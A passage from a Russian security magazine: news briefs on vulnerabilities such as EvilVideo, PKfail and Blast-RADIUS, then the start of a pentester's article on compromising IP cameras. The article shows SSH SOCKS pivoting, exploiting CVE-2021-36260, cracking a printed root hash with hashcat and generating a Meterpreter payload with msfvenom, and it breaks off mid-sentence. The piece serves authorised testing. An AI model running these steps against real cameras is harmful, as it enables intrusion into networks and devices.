   долларов США из‑за проблемного обновления CrowdStrike. Причем в эту
   оценку не включены убытки Microsoft, так как она «являлась ключевым игро‐
  ком в этом событии».
    В Parametrix считают, что некоторые отрасли из списка Fortune 500 прак‐
   тически не пострадали. Так, производство, транспорт (за исключением ави‐
   акомпаний) и финансы, по оценкам исследователей, понесли убытки в раз‐
  мере нескольких десятков миллионов долларов. Тогда как розничная тор‐
   говля и ИТ потеряли около половины миллиарда, авиакомпании — 860 мил‐
  лионов долларов, а банковский и медицинский секторы — более трех мил‐
   лиардов.


 КОРПОРАТИВНЫЕ ПЕНТЕСТЫ

   Специалисты  Positive  Technologies  рассказали  о  результатах  пентестов,  проведенных
   в 2023 году. Практически во всех компаниях, где проводилось внутреннее тестирование, зло‐
   умышленники могли бы установить полный контроль над ИТ‑инфраструктурой.

   Минимальный срок проникновения в локальную сеть составил один день.

  В среднем специалистам требовалось 10 дней для получения доступа.

  В 63% организаций злоумышленник с низкой квалификацией мог проникнуть в локальную сеть
   извне.





                  Техники по матрице MITRE ATT&CK, которые позволили получить доступ в сеть

    Почти во всех компаниях удалось получить учетные данные сотрудников и несанкциони-
   рованный доступ к важной конфиденциальной информации, включая интеллектуальную
   собственность и служебную переписку,  а  также  установить полный контроль
  над инфраструктурой.

    Также в ходе пентестов было обнаружено 423 уязвимости, из которых 34% представляли
   серьезную опасность.


   Основными причинами неудовлетворительного состояния защищенности организаций были
   названы: устаревшие версии ПО, небезопасная конфигурация компонентов ИТ‑систем
   и недостатки парольной политики.





  В 21% случаев в системах заказчиков вообще были обнаружены следы реальной компромета‐
   ции, в том числе работающие веб‑интерпретаторы командной строки или изменения в кон‐
   фигурационных файлах.





 НЕОБРАТИМАЯ
 ДЕГРАДАЦИЯ INTEL
  На протяжении нескольких месяцев компания Intel изучала сообщения о том,
   что процессоры 13-го и 14-го поколений  (в  частности, Core i9-13900K
  и -14900K) работают со сбоями под определенными нагрузками, а именно
  во время игр. Теперь стало известно, что обновленный микрокод для устра‐
  нения проблемы будет передан производителям материнских плат в середи‐
  не августа.
     Впервые информация о том, что многие пользователи Core i9-13900K и i9-
  14900K сталкиваются со странными сбоями в работе десктопных процес‐
  соров Intel во время игр, появилась в СМИ в апреле текущего года. Тогда ста‐
  ло известно, что сбои могут возникать даже в таких сравнительно малот‐
   ребовательных играх, как Fortnite, а также Hogwarts Legacy, Remnant 2, Alan
  Wake 2, Horizon: Zero Dawn, The Last of Us Part 1 и Outpost: Infinity Siege.
      Также проблемы  могли  затрагивать такие  родственные  процессоры,
   как i9-13900KF, i9-14900KF, i9-13900KS и i9-14900KS. И, согласно сообщени‐
  ям отдельных пользователей, сбои могли проявляться в сериях i7-13700K
  и i7-14700K.


            «Intel известно о сообщениях, что разблокированные процессоры Intel
         Core 13-го и 14-го поколений сталкиваются с проблемами при выпол- «
        нении определенных рабочих нагрузок. В сотрудничестве с нашими
          партнерами мы проводим анализ этих сообщений», — заявили тогда
         в Intel.                 »
   Позже в компании сообщили, что причиной сбоев могут быть производители
   материнских плат, которые позволяют увеличивать предельное энергопот‐
   ребление и отключают защитные функции, чтобы добиться от процессоров
   большей производительности.

         «Хотя первопричина пока не установлена,  Intel заметила, что боль-
         шинство сообщений о данной проблеме поступает от пользователей «
         с  материнскими  платами,  поддерживающими  разблокировку/раз-
          гон, — говорили разработчики. — По наблюдениям Intel, в BIOS плат
         с чипсетами серий 600/700 часто представлены настройки по умол-
         чанию, отключающие защиту от перегрева и защиту питания, соз-
        данные для предохранения процессоров от длительного воздействия
          высокого напряжения и частот».                 »
  В частности, в Intel писали, что проблемы могут вызывать следующие нас‐
   тройки:
   • отключение Current Excursion Protection (CEP);
   • включение IccMax Unlimited bit;
   • отключение Thermal Velocity Boost (TVB) или Enhanced Thermal Velocity
     Boost (eTVB);
   • отключение C-states;
   • использование режима Windows Ultimate Performance;
   • повышение PL1 и PL2 сверх рекомендованных Intel пределов.

  В итоге Intel рекомендовала производителям материнских плат выпустить
   обновления для BIOS и использовать рекомендованные значения по умол‐
  чанию.
      Теперь в компании наконец завершили расследование. Ожидается, что
   обновление микрокода для устранения проблемы будет направлено про‐
   изводителям материнских плат в середине августа, после проведения тестов.
  Патч будет распространяться в виде обновления BIOS от OEM-производите‐
  лей материнских плат, а также через обновления Windows.
      Пока в Intel не раскрыли подробностей, но сообщили, что анализ проб‐
  лемных  процессоров  выявил,  что  «повышенное  рабочее  напряжение
  [вызывающее сбои] связано с алгоритмом микрокода, приводящим к неп‐
   равильным запросам напряжения на процессор». Иными словами, процес‐
  сор запрашивает и получает слишком много питания, что заставляет его
  работать за пределами безопасных границ и со временем приводит к сни‐
  жению его стабильности.
    При этом издание Tom’s Hardware предупредило, что эти проблемы
   «вызывают  необратимую  деградацию  процессоров»,  то  есть  грядущее
   исправление, к сожалению, не сможет устранить уже нанесенный ущерб.
      Сообщается, что  Intel продолжит заменять процессоры, которые уже
   демонстрируют странное поведение. То есть всем пользователям, которые
  уже столкнулись со сбоями, рекомендуется обратиться в службу поддержки
   клиентов.


  УТЕКЛИ 150 БД РОССИЙСКИХ КОМПАНИЙ

    Аналитики FACCT подсчитали, что в первом полугодии 2024 года в открытый доступ на андегра‐
   ундных форумах и в тематических Telegram-каналах попали 150 баз данных российских ком‐
   паний.

   За аналогичный период прошлого года их было 119, а за весь прошлый год злоумышленники
   опубликовали 246 БД.

   Около 30% от общего числа утечек в 2024 году составили базы данных компаний, специали‐
   зирующихся на розничной онлайн‑торговле.


   Данные из большинства опубликованных БД датированы 2024 годом, и большая часть из них
   включают такую информацию, как ФИО, адреса проживания, пароли, даты рождения,
   паспортные данные, телефонные номера.





 УЯЗВИМОСТЬ В
 TELEGRAM
   Эксперты компании ESET сообщили об уязвимости нулевого дня в Telegram
  для Android, получившей название EvilVideo. Проблема позволяла злоумыш‐
   ленникам  отправлять  пользователям  вредоносные  APK-файлы,  замас‐
   кированные под видеофайлы.
    По данным исследователей, хакер под ником Ancryno начал продавать
   эксплоит для этой 0-day-проблемы еще 6 июня 2024 года. В своем сооб‐
  щении на хакфоруме XSS он  писал,  что баг  присутствует в Telegram
  для Android версии 10.14.4 и старше.





   Хотя исходно злоумышленник утверждал, что эксплоит относится к типу one-
   click (то есть срабатывает за один клик и требует минимального взаимодей‐
   ствия с человеком), на самом деле для выполнения вредоносной полезной
   нагрузки на устройстве жертвы требовался ряд шагов и определенные нас‐
   тройки, что заметно снижало риск успешной атаки.
      Специалисты ESET смогли обнаружить проблему после того, как в пуб‐
  личном Telegram-канале была опубликована PoC-демонстрация уязвимости,
   что позволило им получить вредоносную полезную нагрузку.
      Согласно  отчету  компании,  эксплоит  действительно работал  только
   в Telegram версии 10.14.4 и старше. Аналитик ESET Лукаш Стефанко (Lukas
   Stefanko) уведомил о проблеме разработчиков Telegram 26 июня и еще
  раз 4 июля 2024 года. Вскоре после этого представители Telegram ответили,
   что изучают сообщение исследователей, а затем исправили уязвимость
   в версии 10.14.5, вышедшей 11 июля 2024 года.
       Хотя неизвестно, эксплуатировалась ли эта проблема в реальных атаках,
  ESET обнаружила по адресу infinityhackscharan.ddns[.]net управляющий сер‐
   вер, который использовался упомянутой выше полезной нагрузкой. Кроме
   того, на VirusTotal удалось найти два вредоносных APK-файла, использующих
   этот  управляющий  сервер.  Обнаруженные  приложения  выдавали  себя
  за Avast Antivirus или xHamster Premium Mod.
      EvilVideo позволяла злоумышленникам создавать специальные файлы
  APK, которые при  отправке  другим  пользователям Telegram  выглядели
   как встроенные видео.
      Исследователи считают, что эксплоит использовал API Telegram для соз‐
  дания сообщения на программном уровне, которое выглядело как 30-секун‐
  дное видео.
     Так как по умолчанию Telegram для Android автоматически загружает меди‐
   афайлы, пользователи получали полезную нагрузку на свое устройство, сразу
   после того, как открывали беседу. Если же у пользователя была отключена
   автоматическая загрузка, ему нужно было кликнуть на превью, чтобы ини‐
   циировать загрузку файла.
      Когда пользователь пытался воспроизвести фальшивое видео, Telegram
   сообщал, что не может открыть ролик, и предлагал использовать внешний
   плеер, что могло побудить жертву нажать кнопку «Открыть» и выполнить
   полезную нагрузку.





   Впрочем, на следующем этапе требовался дополнительный шаг, серьезно
   снижавший эффективность таких атак: жертва должна была вручную раз‐
  решить установку приложений из неизвестных источников в настройках, что‐
  бы вредоносный APK смог установиться на устройство.





   Специалисты ESET отмечают, что протестировали эксплоит в веб‑клиенте
   Telegram и Telegram для десктопов и убедились, что там он не работает, пос‐
   кольку полезная нагрузка воспринимается как видеофайл в формате MP4.
    В исправленной версии Telegram для Android (10.14.5) APK-файлы тоже
   отображаются корректно, и выдать их за видеоролики больше не получится.



   Представитель пресс‑службы Telegram сообщил «Хакеру», что в компании не считают описан‐
   ный баг уязвимостью, поскольку пользователь должен сам разрешить установку «плеера». Под‐
   робнее о том, как работает этот баг, и о нестыковках в заявлениях Telegram читай в нашей
   статье «Убойное видео. Как я написал эксплоит для бага в Telegram и что было дальше».





  ГЛАВА GOOGLE DEEPMIND СРАВНИЛ ИИ С КОТОМ
   Выступая на конференции Future of Britain Conference 2024, CEO Google DeepMind Демис Хас‐
   сабис (Demis Hassabis) сравнил уровень современного искусственного интеллекта с уровнем
   обычных домашних кошкек.
       Отвечая на вопрос о прогрессе DeepMind в области AGI, Хассабис пояснил, что современ‐
   ный ИИ может писать, рисовать и создавать музыку, напоминая человека, но общий интеллект
   даже у кошки гораздо выше.

             «Пока мы не достигли даже уровня кошачьего интеллекта, если говорить →         о системе в целом. В настоящее время мы далеки от интеллекта человеческого
           уровня по всем направлениям. Хотя в определенных областях, таких как игры,
        ИИ превосходит даже лучших людей мира», — заявил Хассабис во время пуб‐
          личной дискуссии с Тони Блэром (бывший премьер‑министр Великобритании).





 UEFI-ПРОБЛЕМА
 PKFAIL
   Сотни моделей устройств многих крупных производителей (Acer, Aopen, Dell,
   Formelife, Fujitsu, Gigabyte, HP, Intel, Lenovo и Supermicro) подвергаются риску
   взлома из‑за критической проблемы PKfail, обнаруженной в цепочке поставок
   UEFI. Проблема позволяет злоумышленникам обойти защиту Secure Boot
  и установить вредоносное ПО.
      Эксперты компании Binarly, обнаружившие PKfail, говорят, что уязвимые
   устройства  используют   криптографические   тестовые   «мастер‑ключи»
  для Secure Boot, также известные как Platform Key, созданные компанией
  American Megatrends International (AMI). Такие ключи помечены как «DO NOT
  TRUST», и предполагалось, что производители должны заменить их собствен‐
  ными, сгенерированными безопасно ключами.


                                        Продолжение статьи →
← Начало статьи





          «OEM-производители и поставщики устройств зачастую не заменяют
          Platform Key, управляющий базами данных Secure Boot и поддержи- «
       вающий всю цепочку доверия от прошивки к операционной системе.
       В результате устройства поставляются с ненадежными ключами», —
          объясняют специалисты Binarly.                 »
   Среди производителей устройств с UEFI, которые использовали ненадежные
   тестовые ключи, числятся Acer, Aopen, Dell, Formelife, Fujitsu, Gigabyte, HP,
    Intel, Lenovo и Supermicro, а ключи с отметками «DO NOT SHIP» и «DO NOT
  TRUST» применялись в 813 различных продуктах. Полный список можно найти
  здесь.
      Очевидно, что ключи AMI вообще не предназначались для использования
   в производственных системах, и AMI предоставляла их клиентам и потен‐
   циальным покупателям для тестирования. Однако еще в 2022 году некто
   опубликовал в публичном репозитории GitHub Platform Key (его приватную
   часть в зашифрованном виде).
      Репозиторий    находился    по    адресу    https://github.com/raywu-
   aaeon/Ryzen2000_4000[.]git, и неизвестно, когда именно он был удален.
  При этом зашифрованный файл оказался защищен паролем всего из четырех
   символов, то есть взлом пароля и извлечение данных были тривиальной
   задачей.
      Утечка ключа оставалась практически незамеченной до января 2023 года,
  пока исследователи Binarly не обнаружили тот же ключ при расследовании
   другого инцидента, связанного с атакой на цепочку поставок, в итоге заин‐
   тересовавшись проблемой.
     Как предупреждают исследователи, эксплуатация PKfail позволит зло‐
   умышленникам, имеющим доступ к уязвимым устройствам и приватной части
   Platform Key, обойти Secure Boot, манипулируя базами данных Key Exchange
   Key, Signature Database и Forbidden Signature Database.
      Скомпрометировав всю цепочку, от прошивки до операционной системы,
   атакующие смогут подписать свой вредоносный код и развернуть на машине
   UEFI-малварь, подобную CosmicStrand и BlackLotus.

          «Первая   прошивка,   уязвимая   для    PKfail,   была   выпущена
         в мае 2012 года, а последняя — в июне 2024 года. В целом это делает «
         данную проблему с цепочкой поставок одной из самых длительных
         в своем роде, ведь она существует уже более двенадцати лет», —
         говорят исследователи.                 »
  Для борьбы с PKfail производителям рекомендуется генерировать Platform
  Key и управлять им, следуя передовым методам управления криптографичес‐
  кими ключами. Также, разумеется, всегда следует заменять собственными
   тестовые  ключи,  предоставляемые  независимыми  поставщиками  BIOS,
  такими как AMI.
      Пользователям исследователи посоветовали следить за обновлениями
   прошивки от производителей их устройств и как можно скорее установить
  любые исправления, которые будут связаны с устранением проблемы PKfail.
   Также эксперты Binarly запустили сайт pk.fail, который призван помочь поль‐
   зователям просканировать и обнаружить уязвимые перед PKfail устройства
  и вредоносные полезные нагрузки.


 POC-ЭКСПЛОИТЫ В АТАКАХ

    Cloudflare подготовила отчет о безопасности приложений за 2024 год. Оказалось, злоумыш‐
   ленники начинают применять доступные PoC-эксплоиты в реальных атаках практически сразу.
   Иногда атаки начинаются всего через 22 минуты после публикации эксплоитов в открытом
    доступе.


   По мнению специалистов, единственным способом борьбы с такой скоростью атак является
   использование ИИ для быстрой разработки эффективных правил обнаружения.

   Чаще  всего  атакам  подвергались следующие  уязвимости: CVE-2023-50164 и CVE-2022-
   33891   в    продуктах  Apache,   CVE-2023-29298,   CVE-2023-38203   и   CVE-2023-
   26360 в ColdFusion, а также CVE-2023-35082 в MobileIron.





  Еще один интересный факт из  отчета  Cloudflare: 6,8% от общего объема ежедневного
   интернет‑трафика — это DDoS-атаки, направленные на вывод из строя онлайн‑приложений
   и сервисов. В предыдущий период (в 2022–2023 годах) этот показатель составлял 6%, то есть
   общий объем DDoS-трафика растет.

    Cloudflare отмечает, что во время крупных атак вредоносный трафик может составлять до 12%
   от всего HTTP-трафика.





 АТАКА BLAST-RADIUS
   Группа ИБ‑специалистов и  ученых  (из  Cloudflare,  Microsoft,  BastionZero,
   Калифорнийского  университета в Сан‑Диего и Амстердамского  универ‐
   ситета) привлекла внимание к уязвимости (CVE-2024-3596) в протоколе
  RADIUS, который существует и используется больше 30 лет. Атака Blast-
  RADIUS позволяет злоумышленникам компрометировать сети и устройства
  с помощью MitM-атак и коллизий MD5.
      Протокол RADIUS (Remote Authentication Dial-In User Service) был раз‐
  работан в 1991 году и известен еще со времен dial-up. С тех самых пор он
   остается фактическим стандартом для облегченной аутентификации и под‐
   держивается практически во всех коммутаторах, маршрутизаторах, точках
   доступа и VPN-концентраторах, выпущенных за последние десятилетия. Так,
  RADIUS остается важным компонентом для управления взаимодействием
   клиент — сервер и используется для обеспечения:
   • VPN-доступа;
   • DSL и  оптоволоконных  соединений,  предлагаемых  интернет‑провай‐
     дерами;
   • работы Wi-Fi и аутентификации 802.1X;
   • роуминга в сетях 2G и 3G;
   • DNN-аутентификации в сетях 5G;
   • аутентификации через частные APN для подключения мобильных устрой‐
      ств к корпоративным сетям;
   • аутентификации на устройствах управления КИИ;
   • Eduroam и OpenRoaming Wi-Fi.

  RADIUS обеспечивает бесперебойное взаимодействие между клиентами (как
   правило, роутерами, коммутаторами и другими устройствами, предоставля‐
  ющими доступ к сети) и центральным сервером RADIUS, который выступает
   в роли гейткипера для аутентификации пользователей и политик доступа.
  Задача RADIUS — обеспечить централизованное управление аутентифика‐
   цией, авторизацией и учетом удаленных входов в систему. Иногда речь идет
  о десятках тысяч устройств в одной сети.
      Атака Blast-RADIUS эксплуатирует уязвимость протокола и коллизии MD5,
   позволяя злоумышленникам, имеющим доступ к трафику RADIUS, манипу‐
   лировать ответами сервера и добавлять произвольные атрибуты, что дает
   возможность  получить  права  администратора  на  устройствах  RADIUS
  без применения брутфорса или кражи учетных данных. Атака затрагивает все
  режимы аутентификации RADIUS/UDP, кроме тех, которые используют EAP
   (Extensible Authentication Protocol).


           «Атака Blast-RADIUS позволяет злоумышленнику, находящемуся между
          клиентом и сервером RADIUS,  подделать настоящее  accept-сооб- «
        щение протокола в ответ на неудачный запрос аутентификации, —
          объясняют исследователи. — Это может дать злоумышленнику доступ
          к сетевым устройствам и сервисам без необходимости угадывать
        или  взламывать пароли или  shared-секреты. В  итоге  атакующий
        не получает учетные данные пользователя. Злоумышленник, исполь-
        зующий нашу атаку, имеет возможность повысить свои привилегии
         от частичного доступа к сети до входа на любое устройство, исполь-
        зующее RADIUS для аутентификации, или присвоить себе произволь-
        ные сетевые права».                 »





                                      Схема атаки

   Дело в том, что протокол RADIUS использует хешированные MD5 запросы
  и ответы при выполнении аутентификации на устройстве. PoC-эксплоит, раз‐
   работанный специалистами, вычисляет хеш‑коллизию MD5 с выбранным пре‐
   фиксом, необходимую для подделки  корректного  ответа Access-Accept,
   обозначающего успешный запрос на аутентификацию. Затем этот поддель‐
  ный MD5-хеш внедряется в сетевое соединение с помощью атаки man-in-the-
   middle, что позволяет злоумышленнику войти в систему.
      Эксплуатация проблемы и подделка хеша MD5 занимает от 3 до 6 минут,
   то есть больше, чем 30–60-секундные тайм‑ауты, обычно используемые
   в RADIUS. Однако каждый шаг коллизионного алгоритма, применяемого
   в атаке, может быть эффективно распараллелен, а также поддается аппарат‐
  ной оптимизации. То есть злоумышленник с хорошими ресурсами может осу‐
   ществить атаку с помощью GPU, FPGA и другого современного и быстрого
   оборудования, чтобы добиться меньшего времени выполнения, ускорив атаку
   в десятки или даже сотни раз.
      Поскольку атака не компрометирует учетные данные конечного поль‐
   зователя, для защиты от нее конечные пользователи не могут сделать ничего.
   Однако производителям и системным администраторам, которые создают
   RADIUS-устройства и управляют ими, рекомендуется следовать уже дос‐
  тупным рекомендациям.
     Для защиты от Blast-RADIUS сетевые операторы могут перейти на RADIUS
   over TLS (RADSEC), мультихоповые развертывания RADIUS и изолировать
   трафик RADIUS от интернета с помощью VLAN с ограниченным доступом
  или туннелирования TLS/IPsec.
    По мнению исследователей, в долгосрочной перспективе единственным
  способом обезопасить RADIUS является передача данных по TLS или DTLS,
   что позволит обеспечить должную безопасность, включая конфиденциаль‐
   ность пользовательских данных в запросах и целостность ответов Access-
   Accept и Access-Reject.
       Хотя рабочая  группа  IETF уже  разрабатывает новую  спецификацию,
  которая будет направлена именно на это, подобные масштабные изменения
   занимают месяцы или годы. Так, некоторые имплементации RADIUS (нап‐
  ример, от Microsoft) пока вообще не поддерживают TLS.

          «Учитывая огромное количество усилий, приложенных к обеспечению
         безопасности таких протоколов, удивительно, что такой вездесущий «
          протокол, как RADIUS, получил так мало внимания криптоаналитиков
         за прошедшие годы. TLS может быть  харизматичной мегафауной
         (этим  термином  обозначают  животных,  снискавших  популярность
         в социальной среде и часто использующихся для получения общес-
          твенной поддержки, например экологических инициатив. — Примеч.
          ред.) в исследованиях криптографических протоколов, но для того,
          чтобы  действительно защитить инфраструктуру, нужно проанализи-
         ровать и  защитить всю  вселенную  корпоративной  безопасности,
         которую  академические  криптографы  практически не  видят и не
         понимают», — заключают специалисты.                 »

  TELEGRAM ОШТРАФОВАЛИ НА 3 000 000 РУБЛЕЙ
    Таганский суд Москвы оштрафовал мессенджер Telegram на 3 миллиона рублей за отказ уда‐
   лить информацию об антиправительственных акциях.


   По данным СМИ, сотрудники Роскомнадзора обнаружили в Telegram-каналах «недостоверную
   информацию о Вооруженных силах РФ, а также призывы к участию в антиправительственных
    выступлениях». Ведомство направило в Telegram предостережение с требованием удалить эти
    посты, однако требование было проигнорировано. После этого в отношении компании был сос‐
   тавлен протокол об административном правонарушении.


    Отмечается, что представители Telegram в суд не явились, хотя и были уведомлены о заседа‐
   нии. Решение было принято в их отсутствие.





 GOO.GL
 ЗАКРЫВАЕТСЯ
   Компания Google объявила, что в 2025 году сервис для сокращения ссылок
   goo.gl окончательно прекратит свою работу. После этого все короткие ссылки
   перестанут функционировать и будут возвращать ошибку 404.
      Напомним, что запущенный в далеком 2009 году goo.gl закрылся для поль‐
   зователей и разработчиков еще в 2018 году. Тогда в Google заявили, что
  на рынке появилось множество аналогичных проектов, мобильных устройств,
   голосовых ассистентов, приложений и интернет вообще изменился до неуз‐
   наваемости.
    В итоге в компании сочли, что в сервисе для сокращения URL больше нет
   нужды, и создание новых ссылок, а также аналитика и управление были
   отключены в 2019 году.
      Стоит отметить, что в 2018 году в Google планировали, что разработчики
   в итоге перейдут на динамические ссылки Firebase, но в итоге компания зак‐
  рыла и этот сервис.
     Тем  не  менее  все  последующие  годы  ссылки,  ранее  созданные
  с помощью goo.gl, продолжали работать.
      Теперь же Google сообщили, что вскоре сервис завершит работу окон‐
   чательно: с 23 августа 2024 года для определенного процента существующих
   ссылок goo.gl перед переходом к целевому адресу начнет отображаться про‐
   межуточная страница с уведомлением о том, что вскоре ссылка перестанет
   работать.





  При этом Google предупреждает разработчиков, что эта промежуточная стра‐
  ница сама по себе может помешать корректной работе ссылок goo.gl.


         «Например, если вы используете другие 302-редиректы, промежуточ-
         ная  страница может помешать  правильному  завершению  потока «
          редиректов. Если вы встроили социальные метаданные в целевую
          страницу, промежуточная страница, скорее всего, приведет к тому,
         что они перестанут отображаться там, где отображалась исходная
          ссылка», — предупредили в компании.                 »
  А после 25 августа 2025 года все адреса goo.gl перестанут работать окон‐
   чательно и будут возвращать только ошибку 404.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   У пользователей Hamster Kombat угоняют аккаунты Telegram


    Исследователи выявили тысячи педофилов, изучив логи инфостилеров


   Свежая RCE-уязвимость в Ghostscript уже используется хакерами


  В магазине Google Play нашли рекламную малварь Konfety


   Смартфоны Google Pixel 6 «окирпичиваются» после сброса к заводским настройкам


    Корейский провайдер заразил 600 000 пользователей вредоносным ПО


   Proton запускает альтернативу Google Docs, ориентированную на приватность


    Российские организации подвергаются атакам через взломанные лифты


   Россияне, которых считают админами теневой библиотеки Z-Library, сбежали из‑под домаш‐
   него ареста


  В Google передумали запрещать сторонние cookie в Chrome
COVERSTORY





Все  знают,  что  при  пентесте  можно
получить изображение с камеры видеонаб‐
людения и порадовать тех, кто будет читать
отчет. Эти  картинки  производят  впечат‐
ление, но каков реальный импакт  атаки               DrieVlad                                                                                         Пентестер из УЦСБ
на камеры? Сегодня поговорим о случаях,               @VlaDriev
когда на камерах можно получить шелл,
закрепиться и проксироваться через них.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для специалистов по безопасности,
                          проводящих тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой вред,  причиненный с  применением
                          изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.


Все уже привыкли, что в отчете можно встретить картинку с захваченной пен‐
тестерами видеокамеры.





Безусловно, смотрится круто, но какой от этого импакт? Жизнь — это вам
не игра Watchdogs  2, где  взламывать  устройства можно по  картинке
с камеры. Злоумышленник, наверное, может выследить что‑то важное, наб‐
людая, как сотрудники ходят по коридорам туда‑сюда, а потом использовать
это для социальной инженерии, но все подобные сценарии похожи скорее
на буйный полет фантазии.
  С точки зрения пентеста куда интереснее получить шелл на захваченной
камере. Раз внутри у нее небольшой компьютер, доступ к нему может ока‐
заться небесполезным для атакующего.


КЕЙС 1: ПАРОЛЬ ПО УМОЛЧАНИЮ

Думаю, ты не раз видел подобное окно логина в веб‑интерфейс камеры.





                   Заходим в веб‑интерфейс IP-камеры

Понятно, что первая мысль — пойти в Google и поискать логины и пароли
по умолчанию.


             INFO

                          Иногда  бывает,  что  знать  логин  и  пароль
                         от камеры не обязательно, чтобы получить с нее
                         изображение. Для этого может быть достаточно
                         подобрать  правильную  RTSP-ссылку,  которая
                      похожа на классическую HTTP-ссылку. Найти ее
                          зачастую можно в документации к камере. Также
                       для  этого  создан  скрипт nmap  rtsp-url-
                   brute, но пока что в нем собраны далеко не все
                         варианты ссылок.


Допустим, нам повезло и мы получили доступ в веб‑интерфейс с правами
администратора. Самое простое и быстрое, что мы можем сделать, — поис‐
кать возможность запустить SSH или Telnet. В примере ниже такая воз‐
можность нашлась.





                   Нашли возможности включения SSH

Пробуем активировать SSH. Ставим соответствующую галочку и жмем «Сох‐
ранить».





                Включаем SSH в веб‑интерфейсе камеры

Нам стал доступен порт 22 (TCP). Логично попробовать подключиться к SSH
с теми же логином и паролем, что подошли к веб‑интерфейсу. И у нас получа‐
ется! Хотя, конечно, такое прокатывает не всегда.





                       Подключаемся к камере по SSH

Давай посмотрим, что нам удалось получить. Достаточно быстро понимаем,
что попали в шелл BusyBox, который сильно ограничивает наши действия.
Здесь есть два  пути. Первый — каким‑то образом  попытаться  выйти
из BusyBox в нормальный шелл (Bash, Ash или еще какой‑то). Этот способ
потенциально может дать больший эффект, но он слишком долгий, чтобы
проворачивать его в рамках ограниченного по времени пентеста.
   Поэтому есть  второй  вариант: можем  вспомнить про  штатную  воз‐
можность SSH проксировать трафик. В данном случае мы имеем дело с SSH-
сервером Dropbear. Он легковесный, и его часто устанавливают на камеры.
Казалось бы, для максимальной оптимизации из него должны были убрать
возможности проксирования трафика, но производитель их оставил, чем мы
сейчас и воспользуемся.
  Для проксирования трафика через камеру пробуем подключиться к ней
по SSH с помощью следующей команды:


ssh root@IP -D 4444





        Подключение к SSH с флагом -D для проксирования трафика

При выполнении такой команды на нашей системе поднимается порт с под‐
держкой SOCKS5, который средствами SSH проксирует наше соединение
через целевое устройство, в данном случае камеру. Пробуем проверить, что
коннект работает штатно.





           Обращаемся к целевым ресурсам через proxychains4

Несмотря на то что мы не смогли обойти BusyBox, главной цели удалось дос‐
тичь: проксировать трафик через камеру. На пентестах мне встречались
инфраструктуры, в которых при обращении из сети камер не было никаких
ограничений на доступ, что очень удобно для хакерских дел.


КЕЙС 2: УЯЗВИМОСТЬ В ПРОШИВКЕ

В этом кейсе обсудим, как получить RCE и запивотиться на камере, когда
изначально никакого доступа не удалось получить вообще.
   Тут, правда, начальные условия немного сложнее. Допустим, мы снова
встретили знакомый веб‑интерфейс, попробовали пароли по умолчанию
и еще  несколько популярных паролей. Ничего не подошло, и попасть
в админку мы не смогли. В таком случае можно было бы опустить руки и идти
дальше. Но нет, мы пойдем в Google и поищем зарегистрированные уяз‐
вимости, желательно с готовым эксплоитом.
  Мне удалось найти баг CVE-2021-36260. Это лишь пример, с другим обо‐
рудованием тебе может попасться любой другой баг. Но мне повезло сразу
выйти на готовый эксплоит.
   Импакт от эксплуатации — возможность удаленного выполнения кода
(RCE). Эксплуатация с готовым эксплоитом обычно происходит в одну коман‐
ду.





                        Эксплуатируем CVE-2021-36260

Скрипт успешно отрабатывает, и мы получаем шелл на камере. В данном слу‐
чае это полноценный Ash. Дальнейшие действия могут развиваться как угод‐
но. Можем, например, залить C2 для закрепа или пивотинга. Ну а самый
простой способ я уже описал выше: можно просто проксировать трафик
с помощью SSH.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
         IP-КАМЕРЫ
       НА ПЕНТЕСТАХ
          ИСПОЛЬЗУЕМ ВИДЕОКАМЕРЫ
                  НЕ ПО НАЗНАЧЕНИЮ





КЕЙС 3: ХАРДКОД В ПРОШИВКЕ

В этот раз ситуация будет поинтереснее. Проксировать трафик нам поможет
функция самой прошивки.
   Логинимся в веб‑интерфейс камеры средствами basic-аутентификации:
снова подошли дефолтные креды. И сразу ищем, какие есть возможности
для запуска SSH или Telnet. Таких возможностей не находим.





                    Веб‑интерфейс видеокамеры

Сканируем порты и видим, что нам доступен Telnet.





                          Результат сканирования портов

Недолго  думая,  пробуем  подключиться  к нему с логином и паролем
от веб‑интерфейса. У нас ничего не выходит. Не сдаемся и идем в Google.
Производитель пишет, что Telnet нужен только разработчикам, а обычным
пользователям там делать нечего, и никаких паролей в открытом доступе нет.
Можно было бы отступить, но пентестер — это не обычный пользователь. Я
скачал прошивку с сайта производителя и решил в ней покопаться.





             Скачиваем прошивку камеры с сайта производителя

Пробуем открыть прошивку обычным архиватором вроде 7-Zip. И у нас
получается! Удивительно, но прошивка никак не защищена, не зашифрована
и не использует внутри свою замороченную файловую систему. Все просто
и доступно.





                Обнаружение в прошивке файла /etc/passwd

Мы получили доступ к файловой системе rootfs. В ней есть директория /etc,
а там — файлик passwd. Открываем его и видим хеш от учетки root.





                  Хеш пароля в файле passwd

Комментарии излишни!





Естественно, пробуем брутить этот хеш. Прошивка старенькая — 2019 года,
вероятность сбрутить такой хеш достаточно большая. Забегая вперед, скажу,
что все получится.
   Брутим при помощи hashcat:


hashcat -a 0 -m 500 '$1$ct81jPGd$V4mhTmjAOkTwNhnFsIrmt1' /usr/share/
wordlists/rockyou.txt





                 Успешно подбираем пароль по словарю


             INFO

                   Мне стало интересно, что за камеру я встретил,
                            и, поискав по паролю, я нашел занятную статью
                       на  «Хабрахабре».  Как  оказалось,  это камеры
                             китайского  завода  Brovotech,  где  закупаются
                          многие производители. Если при пентесте встре‐
                      тишь noname-камеру, возможно, тебе подойдет
                          тот же пароль.


Попробуем подключиться к Telnet с помощью пароля, который только что
сбрутили.





                     Успешное подключение к Telnet

Мы смогли подключиться к камере и получить полноценный шелл. Но Telnet,
может быть, и хорош, но он «из коробки» не дает возможности проксировать
трафик, как это делает SSH. Поэтому нам понадобится какое‑то дополнитель‐
ное средство, например SOCKS-прокси или C2.
   Попробуем самый простой и распространенный вариант C2 — Metasploit
с нагрузкой Meterpreter. Антивирусов на камерах я пока ни разу не встречал,
поэтому можно не стесняться.
   Генерируем нагрузку:


msfvenom -p linux/armle/meterpreter/bind_tcp -f elf -o bind





                 Генерируем полезную нагрузку для камеры

Теперь у нас есть бинарь, и встает вопрос о том, как его залить на камеру.
Netcat отсутствует, curl нет, да и вообще почти ничего нет. Остается пересы‐
